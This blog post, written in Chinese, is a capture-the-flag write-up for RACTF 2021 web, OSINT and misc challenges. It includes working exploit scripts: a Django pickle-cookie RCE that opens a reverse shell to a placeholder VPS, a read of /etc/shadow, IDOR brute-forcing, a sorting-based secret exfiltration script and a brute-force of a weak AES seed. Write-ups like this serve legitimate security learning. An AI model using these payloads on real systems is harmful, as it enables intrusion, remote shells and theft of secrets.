---
title: "RACTF2021 Wp"
slug: "ractf2021-wp"
description: "难啊难啊，基本都是赛后复现"
date: 2021-08-18T17:07:55+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

https://github.com/ractf/challenges/tree/master/2021

https://github.com/404dcd/RACTF-challenges

https://blog.ractf.co.uk/tag/ractf-2021/

## Web/Really Awesome Monitoring Dashboard

> 🌟 Perfect infrastructure 🌟

是grafana

![image-20210818005221430](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005221430.png)

但是版本也太新了吧8.1.1，弱口令也没有，抓包可以看到它在不停的请求各种api，其中有个/api/ds/query，以明文方式请求数据库内容

![image-20210818005705121](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005705121.png)

那这就好说了，直接明牌了都

```
SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';
SELECT * FROM flags;
```

![image-20210818011913101](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818011913101.png)

————这个故事告诉我们对于权限的设置是很重要的，不要随便把api接口暴露出来，也不要明文传递信息

## Web/Really Awesome Hidden Service

> Ahoy, matey! Some dirty scallywags seem to not be respectin' th' pirate code! Teach them a lesson by findin' out who they be.
>
> ```
> ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion
> ```

一个Tor的网站，走匿名方式

![image-20210818014430572](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818014430572.png)

那首先要把隐藏在后面的真实ip给找出来。整个网页的内容没有什么特别的，但是通常容易被忽略的是favicon图像，这里可以参考这样一篇文章：[Hunting phishing websites with favicon hashes](https://isc.sans.edu/forums/diary/Hunting+phishing+websites+with+favicon+hashes/27326/)

这里可以用[fav-up](https://github.com/pielco11/fav-up)一把梭（也就是自动化了提取图标->计算mmhash值->shodan搜索出ip这个过程），得到ip为`178.62.4.214|178.62.15.164`

![image-20210818021746841](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818021746841.png)

`ractf{DreadingPirates}`

————除此之外还有一个非预期解，当用非法的host header请求时，会直接返回flag

```bash
$ curl -s --socks5-hostname localhost:9050 -H "Host: asd.com" ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion | grep "ractf"
```

*All you need to do is send the server an invalid host header, which will cause it to fail back to its default vhost which reveals the flag. In retrospect, the solution to this would have been to make the flag only visible on a specific vhost, rather than the default.*

## Web/Emojibook

> ![img](https://b.thumbs.redditmedia.com/4z_KB1qtCsTjcUqxDTbVIpJlR-AMzqrPeZDIz7VKdko.png)
>
> The flag is at `/flag.txt`

可以登录、注册账户、发布note、查看，给出了源码

看源码，是django框架的后端，直奔settings.py

![image-20210815135148402](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815135148402.png)

看到了熟悉的pickle

![image-20210815145254055](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815145254055.png)

在仅有的这个app的view.py中有这样的代码，会在note的body部分匹配`{{.*?}}`这样的内容并将其中的部分拼接到/emoji/后以image的形式加载出来，但是直接用{{/flag.txt}}是不可以的，这部分代码在forms.py中

![image-20210818031453613](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818031453613.png)

所以最终的payload是 `{..{/flag.txt}..}`

`ractf{dj4ng0_lfi}`

————然而这里有个非预期，url部分可以直接修改note编号达到水平越权，也就是说可以通过爆破方式找到之前已经成功的note

```python
import logging
import threading
import time
import requests
def thread_function(name):
    try:
      r=requests.get("http://193.57.159.27:30160/"+str(name))
      if ("base64" in r.text and "cmFjdGZ7" in r.text):
        print(r.text)
    except:
        pass

if __name__ == "__main__":
    threads = list()
    for index in range(1000):
        x = threading.Thread(target=thread_function, args=(index,))
        threads.append(x)
        x.start()
    for index, thread in enumerate(threads):
        thread.join()
```

## Web/Emojybook 2

> no unintended solution this time! the source has not been patched, the unintended solution was caused by my dockerfile
>
> The flag is at `/flag.txt`

跟上面那个前端一模一样，然而这次再用之前的 `{..{/flag.txt}..}`会返回500错误，这回就要用上之前完全没用到的pickle session cookie了。

先读一下/app/notebook/settings.py，得到secret_key，然后搞一个反弹shell的cookie出来

```python
# Modified from https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/
#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
from django.conf import settings
import pickle
import os
import requests

SECRET_KEY = 'wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7"(S3xv,{sp)Xaqg?2pj2=hFCgN"CR"UPn4'

settings.configure(DEFAULT_HASHING_ALGORITHM="sha256")

# Initial cookie when visiting the page
cookie=".eJxNjEEKwjAQRUVwKYKn0E1Impmm3Yl7z1AmSWNbJYW2WQoeIMt4D4-ookL_8r3Hv68ez8V3t7SL64rC1FRhrIeqtSkuS0xxO4OazKX2b7O3Hflzz0zvp6HV7JOwnx3Zqbf19fhvN7ODhsYmxQOQyMjmSIpzLjMCYyRpDTlwI5wAaTNwFhWgwVISaVWgUKiVcM4V4FJgLxnJP1s:1mFhOG:5yO4Fkp6kQCGyt6e5jHf6Gn5V6gqPDWIw21OTFSw8DM"

newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
	def __reduce__(self):
		import os
		return (os.system,("python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"VPS IP\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",))

newContent['testcookie'] = PickleRce()

new_cookie = django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)

# We can then make a request with this cookie
requests.get("http://193.57.159.27:23934/", cookies={
	"sessionid": new_cookie
})
```

得到shell之后我们只是个web用户，读/etc/shadow可以i得到admin的hash值，弱口令 是个999999，然后我们就可以`su admin`，读flag了

`ractf{dj4ng0_lfi_rce_not_unintended}`

参考：[wp](https://techsupportjosh.com/posts/ractf-emojibook/)

## Web/Military Grade

> Go is safe, right? That means my implementation of AES will be secure?

给出了go文件

```go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"sync"
	"time"
)

const rawFlag = "[REDACTED]"

var flag string
var flagmu sync.Mutex

func PKCS5Padding(ciphertext []byte, blockSize int, after int) []byte {
	padding := (blockSize - len(ciphertext)%blockSize)
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func encrypt(plaintext string, bKey []byte, bIV []byte, blockSize int) string {
	bPlaintext := PKCS5Padding([]byte(plaintext), blockSize, len(plaintext))
	block, err := aes.NewCipher(bKey)
	if err != nil {
		log.Println(err)
		return ""
	}
	ciphertext := make([]byte, len(bPlaintext))
	mode := cipher.NewCBCEncrypter(block, bIV)
	mode.CryptBlocks(ciphertext, bPlaintext)
	return hex.EncodeToString(ciphertext)
}

func changer() {
	ticker := time.NewTicker(time.Millisecond * 672).C
	for range ticker {
		rand.Seed(time.Now().UnixNano() & ^0x7FFFFFFFFEFFF000)
		for i := 0; i < rand.Intn(32); i++ {
			rand.Seed(rand.Int63())
		}

		var key []byte
		var iv []byte

		for i := 0; i < 32; i++ {
			key = append(key, byte(rand.Intn(255)))
		}

		for i := 0; i < aes.BlockSize; i++ {
			iv = append(iv, byte(rand.Intn(255)))
		}

		flagmu.Lock()
		flag = encrypt(rawFlag, key, iv, aes.BlockSize)
		flagmu.Unlock()
	}
}

func handler(w http.ResponseWriter, req *http.Request) {
	flagmu.Lock()
	fmt.Fprint(w, flag)
	flagmu.Unlock()
}

func main() {
	log.Println("Challenge starting up")
	http.HandleFunc("/", handler)

	go changer()

	log.Fatal(http.ListenAndServe(":80", nil))
}
```

可以看到flag被AES CBC加密，加密本身没问题，问题出在种子上；种子生成是靠`rand.Seed(time.Now().UnixNano() & ^0x7FFFFFFFFEFFF000)`完成，这样得到的种子很小 可以被我们爆破出来

exp.go

```go
package main

import(
	"math/rand"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"strings"
)

func main() {
	hextext := "35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914" // Encrypted Flag
	for seed:=1; seed<=19777868; seed++ {
		rand.Seed(int64(seed))
		for i := 0; i < rand.Intn(32); i++ {
			rand.Seed(rand.Int63())
		}

		var key []byte
		var iv []byte

		for i := 0; i < 32; i++ {
			key = append(key, byte(rand.Intn(255)))
		}

		for i := 0; i < aes.BlockSize; i++ {
			iv = append(iv, byte(rand.Intn(255)))
		}
		block, _ := aes.NewCipher(key)
		mode := cipher.NewCBCDecrypter(block, iv)
		ciphertext, _ := hex.DecodeString(hextext)

		flagBytes := make([]byte, len(ciphertext))
		mode.CryptBlocks(flagBytes, ciphertext)

		flag := string(flagBytes)
		if strings.Contains(flag, "ractf") {
			fmt.Printf("Flag: %s\n", flag)
			break
		}
	}
}
```

`ractf{int3rEst1ng_M4sk_paTt3rn}`

参考：[wp](https://ctf.rip/write-ups/crypto/ractf-2021-military-grade/)

## Web/Secret Store

> How many secrets could a secret store store if a store could store secrets?

注册和登录之后可以通过api设置一个自己的secret，设置好之后还可以更改

![image-20210818040636796](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818040636796.png)

给出了源码，是django框架，用到了rest_framework，页面的debug模式还开着，有一个名为secret的app

models.py规定了数据库的存储

![image-20210818133525714](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133525714.png)

还有个配套的model serializer，规定了只读和只写的不同内容

![image-20210818133658766](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133658766.png)

然后是views.py，当确认user登录状态之后，如果设置过secret将会展示出来

![image-20210818134115205](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818134115205.png)

直接用Get方式请求`/api/secret/?format=json`可以得到所有设置过的secret，理所当然的猜测id=1,owner=1的value=flag，但是value字段是只写而非只读的

![image-20210818151539994](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818151539994.png)

由于用的是django的rest framework，可以利用它的[Ordering Filter](https://www.django-rest-framework.org/api-guide/filtering/#orderingfilter)功能来对这些json内容根据value来进行一个排序`/api/secret/?ordering=value&format=json`

![image-20210818152408227](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818152408227.png)

采用char-by-char的盲注方式，不断地重复设置secret->以value排序->如果位于id=1,owner=1的前面，并且下一次就位于它的后面，说明这是正确的字符->修改secret，继续爆破下一个字符

exp.py

```python
import requests
import json

flag = "ractf"

csrf_token = "XI7ZT6jdFeTvlywSDvRQT2xFlIAF2BRIF7ndzDOZqWPwZsIRdkbmgFSIpV8m9NIu"
session_id = "hkdm1dclym6oycoe8pcmyvlh5d87qfvq"

headers = {
    "Cookie": f"csrftoken={csrf_token}; sessionid={session_id}",
    "X-CSRFToken": csrf_token
}
our_secret_id = 14


def update_secret(curr_flag):
    found_real_char = False
    for i in range(32, 127):
        payload = curr_flag + chr(i)
        json_payload = {
            "value": payload
        }
        r = requests.post("http://193.57.159.27:21627/api/secret/",
                          data=json_payload, headers=headers)
        # print(r.status_code)
        r = requests.get(
            "http://193.57.159.27:21627/api/secret/?ordering=value&format=json", headers=headers)
        secrets = json.loads(r.text)
        for secret in secrets:
            if secret['id'] == 1:
                found_real_char = True
            if secret['id'] == our_secret_id:
                if found_real_char:
                    return chr(i - 1)
                else:
                    break
    return chr(i - 1)


while True:
    next_char = update_secret(flag)
    flag += next_char
    print('[+] Curr Flag:', flag)
```

`ractf{data_exf1l_via_s0rt1ng_0c66de47}`

参考：[wp1](https://github.com/glikogataki/RACTF-Some-Challs/tree/main/secret_store)  [wp2](https://medium.com/@Nicholaz99/ractf-2021-writeup-647554511dc5)

## Web/I'm a fun

> Agent,
>
> Do you remember the firearms store case from last year? The one they were using as a secret communication platform?
>
> Well, we've located the servers for them, the issue is they're based abroad in a country where we do not have any jurisdiction. Thus, we'll need to gain shell access to their systems the good old way. They're hosting another webapp again, this time it seems like some early version of a social media network that they're working on. This is good for us as it means there will almost certainly be some vulnerabilities present.
>
> We've linked the webapp for you, can you take a look and see if you can gain access to their server?

在/upload/content处可以上传video，特别的是上传处有个`external`

用curl方式请求一下/etc/passwd，`curl -X POST http://193.57.159.27:26635/upload/content -F file=/etc/passwd -F source=internal`

![image-20210818163712187](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818163712187.png)

之后尝试读源码（我没爆出来目录），之后的看wp了，我太菜

![image-20210818170117432](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818170117432.png)

参考：[wp](https://github.com/TheBadGod/ractf2021/blob/main/im_a_fan.md)

## OSINT/Triangles

https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW

![image-20210815120938702](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815120938702.png)

## Miscellaneous/Discord

> Come join our [Discord](https://discord.gg/Rrhdvzn)!

`ractf{so_here_we_are_again}`

## Miscellaneous/Missing Tools

> Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?
>
> Username: `ractf`
>
> Password: `8POlNixzDSThy`
>
> Note: it may take a minute or more for your container to start depending on load

根据给出的信息ssh连入一个终端，可以发现很多的命令都被禁止了

![image-20210818025059013](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025059013.png)

使用`echo /usr/bin/* /bin/*`可以查看能使用的命令还有哪些

![image-20210818025158619](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025158619.png)

————先说一下简单的非预期解：`echo *`找到flag.txt，然后`source flag.txt`或者`sh < flag.txt`都能读出来

而预期解使用的是<u>split+re-sha256</u>的方式。直接用sha256sum得到flag然后想强行暴力破解显然非常的不现实，但是split这个工具可以以固定的字节数来划分给定的文件，如果我们以很小的标尺来划分flag并进行sha256，那么这样得到的hash值就将非常有可能爆破出来，最后再把它们合起来就能得到最终的flag了（这里用3bytes划分）

```bash
$ split -b 3 flag.txt
$ echo *
flag.txt xaa xab xac xad xae xaf xag xah xai xaj xak xal
$ sha256sum xa*
df10b4bd068175bd33f200e48e721a019091c67c06c26ae273da5aaf51424618  xaa
582c3f2f5c5c630d0ee458d5d7c859e7ed36d6fb5862a761e110562438bd4272  xab
a7f5397443359ea76c50be82c77f1f893a060925b51a332cc5da906f83d3344e  xac
569a659ae7633e5ddd7f523b283c1169dad3eb99a3da4b3ad2d5619d9236dc12  xad
7096489b19f4ab1b6c9e1502367c18d5e3adcfeb21b0a0282041ca99e798a14d  xae
618630d1fed7f03ed43dfb03eeae681c1812177c43d3afe1cbe32bb3fee12bf9  xaf
f2f9ca19dad6782e5e92edd758439f11067ae23ab0d418a56f406de6c9bb151a  xag
f481b98f744da847f44f5e67996010859061dca4945e87396016a1ef4ac38460  xah
de7bc3aee118c9689e2cba40c4c427ab8986b8a37c9c4f837e019559de9faffd  xai
a14d511b5d8b444da7ea5ab52feb71271a46bb8374ab24f5251701b23bef4276  xaj
56fb98daea7879c3e2218eb960b9150c2d7978686af5f7f43f80641a6f62b22a  xak
df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246  xal
```

![image-20210818030044169](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030044169.png)

到[CrackStation](https://crackstation.net/)一把梭

![image-20210818030225147](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030225147.png)

`ractf{std0ut_1s_0v3rr4ted_spl1t_sha}`

------

害，前几天状态莫名很差，之前报的几个周末的ctf甚至连签到都没签，复现也是一拖再拖，拖到环境都关完了，挺后悔的，是自己的问题。

在反思和调整了，嗯。
